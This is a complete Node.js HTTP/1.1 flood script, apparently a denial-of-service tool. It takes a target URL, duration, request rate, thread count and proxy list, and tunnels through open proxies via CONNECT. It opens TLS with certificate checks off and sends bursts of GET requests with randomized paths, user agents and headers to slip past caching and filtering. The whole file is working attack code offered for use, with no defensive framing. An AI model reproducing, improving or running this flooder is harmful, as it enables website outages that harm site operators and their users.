//http1.1 raw flood highrps
const net = require("net");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function () { });

if (process.argv.length < 7) {
    console.log(`node tlshttp1.js target time rate threads proxyfile`);
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
const fetch_site = ["none", "same-origin", "same-site", "cross-site"];
const languages = [
    "en-US",
    "en-GB",
    "en",
    "de",
    "fr",
    "es",
    "pt-BR",
    "it",
    "ru",
    "ja",
    "nl",
    "pl",
    "ko",
    "tr",
    "sv",
    "au"
];
const useragents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.7.3 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15"
];
function buildHeaders() {
    const rand_query = "?" + randomString(12) + "=" + randomIntn(100000, 999999);
    const rand_path = (parsedTarget.path || "/") + rand_query;

    const headers = [
        `GET ${rand_path} HTTP/1.1`,
        `Host: ${parsedTarget.host}`,
        `user-agent: ${randomElement(useragents)}`,
        `accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
        `accept-language: ${randomElement(languages)}`,
        `accept-encoding: gzip, deflate, br`,
        `sec-fetch-site: ${randomElement(fetch_site)}`,
        `sec-fetch-dest: document`,
        `sec-fetch-mode: navigate`,
        `upgrade-insecure-requests: 1`
    ];
    headers.push(`connection: keep-alive`, '', '');
    return headers.join('\r\n');
}
const Header = new class {
    HTTP(options, callback) {
        const payload =
            `CONNECT ${options.address} HTTP/1.1\r\n` +
            `Host: ${options.address}\r\n` +
            `Connection: keep-alive\r\n\r\n`;

        const conn = net.connect({
            host: options.host,
            port: options.port
        });

        conn.setTimeout(10000);
        conn.setKeepAlive(true, 60000);
        conn.on("connect", () => conn.write(payload));
        conn.on("data", chunk => {
            if (chunk.toString().includes("200")) {
                callback(conn, null);
            } else {
                conn.destroy();
                callback(null, "error");
            }
        });
        conn.on("error", () => {
            conn.destroy();
            callback(null, "error");
        });
        conn.on("timeout", () => {
            conn.destroy();
            callback(null, "error");
        });
    }
};

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 0);
}

function runFlooder() {
    const proxy = randomElement(proxies);
    if (!proxy || !proxy.includes(":")) return;
    const [phost, pport] = proxy.split(":");
    
    Header.HTTP({
        host: phost,
        port: pport,
        address: parsedTarget.host + ":443"
    }, (connection, error) => {
        if (error) return;
        
        const tlsOptions = {
            socket: connection,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            ALPNProtocols: ["http/1.1"]
        };
        const tlsConn = tls.connect(tlsOptions);
        tlsConn.setKeepAlive(true, 60000);
        tlsConn.on("secureConnect", () => {
            setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = buildHeaders();
                    tlsConn.write(request);
                }
            }, 1000);
        });
        tlsConn.on("close", () => {
            tlsConn.destroy();
            connection.destroy();
        });
    });
}
setTimeout(() => process.exit(1), args.time * 1000);